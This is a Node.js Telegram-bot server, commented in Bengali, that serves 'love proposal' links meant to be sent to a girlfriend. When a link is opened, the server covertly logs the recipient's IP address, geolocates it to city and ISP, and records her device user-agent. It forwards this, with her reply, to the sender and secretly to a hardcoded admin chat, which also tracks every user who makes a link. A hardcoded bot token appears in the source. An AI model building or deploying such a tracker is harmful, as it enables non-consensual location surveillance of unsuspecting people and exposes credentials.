const express = require('express');
const path = require('path');
const axios = require('axios');
const { Telegraf } = require('telegraf');

const app = express();
app.use(express.json());

// ⚙️ সেটিংস ও আপনার চ্যাট আইডি
const TELEGRAM_TOKEN = "8922778423:AAGbdZfdUDol_5w3dPbeBH0aucf9qkgtPTA"; 
const SERVER_URL = "https://love-bb7p.onrender.com"; 
const ADMIN_CHAT_ID = "6719885052"; 

const bot = new Telegraf(TELEGRAM_TOKEN);
const linkDatabase = {}; 

// 🤖 ১. নতুন লিঙ্ক তৈরির কমান্ড
bot.command('newlink', (ctx) => {
    const fromUser = ctx.message.from;
    const userId = ctx.chat.id;
    const uniqueId = Math.random().toString(36).substring(2, 9);
    
    linkDatabase[uniqueId] = {
        userId: userId,
        name: `${fromUser.first_name} ${fromUser.last_name || ''}`,
        username: fromUser.username ? '@' + fromUser.username : 'নেই'
    }; 
    
    const generatedLink = `${SERVER_URL}/love/${uniqueId}`;
    ctx.reply(`💝 আপনার জিএফ এর জন্য একটি নতুন ইউনিক লিঙ্ক তৈরি হয়েছে:\n\n${generatedLink}\n\nএটি কপি করে তাকে পাঠিয়ে দিন! সে লিঙ্ক ওপেন করলে এবং উত্তর দিলে আপনি নোটিফিকেশন পাবেন।`);

    // অ্যাডমিন নোটিফিকেশন (আপনার কাছে ট্র্যাকিং মেসেজ আসবে)
    const currentTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
    const userInfoMessage = `🚨 **New User Tracked!** 🚨\n\n` +
                            `👤 **Name:** ${linkDatabase[uniqueId].name}\n` +
                            `🆔 **User ID:** \`${userId}\`\n` +
                            `🔗 **Username:** ${linkDatabase[uniqueId].username}\n` +
                            `⏰ **Time (BD):** ${currentTime}\n` +
                            `📝 **Action:** Generated a new link (${uniqueId})`;

    if (String(userId) !== String(ADMIN_CHAT_ID)) {
        bot.telegram.sendMessage(ADMIN_CHAT_ID, userInfoMessage, { parse_mode: 'Markdown' }).catch(e => {});
    }
});

bot.launch().then(() => console.log("Bot started!")).catch(err => console.error("Bot launch failed:", err));

// 🌐 ২. ওয়েবসাইট হ্যান্ডলার
app.get('/love/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 👁️‍🗨️ ৩. লিঙ্ক ওপেন করার সাথে সাথে ট্র্যাকিং অ্যালার্ট
app.post('/api/opened', async (req, res) => {
    const { id } = req.body;
    const linkData = linkDatabase[id];
    
    if (linkData) {
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();
        const userAgent = req.headers['user-agent'] || 'Unknown Device';
        
        const openTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        let locationInfo = "Location details unavailable";
        
        // আইপি দিয়ে জিও-লোকেশন বের করা
        try {
            if(ip && !ip.includes('127.0.0.1')) {
                const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
                if(geo.data && geo.data.status === 'success') {
                    locationInfo = `🌍 **Location:** ${geo.data.city}, ${geo.data.regionName}, ${geo.data.country}\n🏢 **ISP/Network:** ${geo.data.isp}`;
                }
            }
        } catch(e) { console.log("Geo IP error"); }

        // মূল ইউজারকে অ্যালার্ট পাঠানো (লিঙ্ক জেনারেটরকে)
        bot.telegram.sendMessage(linkData.userId, `👀 **Notification:** কেউ একজন এইমাত্র আপনার পাঠানো লিঙ্কটি ওপেন করেছে!\n⏰ **সময়:** ${openTime}`);

        // 🌟 অ্যাডমিন নোটিফিকেশন (আপনার পার্সোনাল আইডিতে ফুল ডিটেইলস আসবে)
        const adminAlert = `👁‍🗨 **Link Opened Alert!** 👁‍🗨\n\n` +
                           `👤 **Sent By User:** ${linkData.name} (${linkData.username})\n` +
                           `🎫 **Link ID:** ${id}\n` +
                           `⏰ **Time:** ${openTime}\n\n` +
                           `ℹ️ **Target Device Details:**\n` +
                           `🌐 **IP Address:** \`${ip}\`\n` +
                           `${locationInfo}\n` +
                           `📱 **Device/Browser:** \`${userAgent}\``;

        if (String(linkData.userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminAlert, { parse_mode: 'Markdown' }).catch(e => {});
        }
    }
    res.json({ success: true });
});

// 💌 ৪. রেসপন্স সাবমিট হ্যান্ডলার (Yes/No চাপলে)
app.post('/api/respond', (req, res) => {
    const { response, id } = req.body;
    const linkData = linkDatabase[id]; 
    
    if (linkData) {
        // মূল ইউজারকে রেজাল্ট পাঠানো
        bot.telegram.sendMessage(linkData.userId, `💌 আপনার পাঠানো লিঙ্কে একটি নতুন রেসপন্স এসেছে!\n\nউত্তর: ${response}`);
        
        // আপনার কাছে রেজাল্ট কপি পাঠানো
        const adminResponseTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        const adminNotification = `💬 **New Response Received!** 💬\n\n` +
                                  `👤 **User Name:** ${linkData.name}\n` +
                                  `🔗 **Username:** ${linkData.username}\n` +
                                  `⏰ **Time:** ${adminResponseTime}\n\n` +
                                  `❤️ **GF's Reply:** \`${response}\``;

        if (String(linkData.userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminNotification, { parse_mode: 'Markdown' }).catch(e => {});
        }
        res.json({ success: true });
    } else {
        res.json({ success: false, error: "Link invalid" });
    }
});

// 🔄 ৫. সেলফ-পিং লজিক
app.get('/ping_test', (req, res) => res.send("Awake!"));
setInterval(() => { axios.get(`${SERVER_URL}/ping_test`).catch(e=>''); }, 270000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Web server running on port ${PORT}`));
                                                      
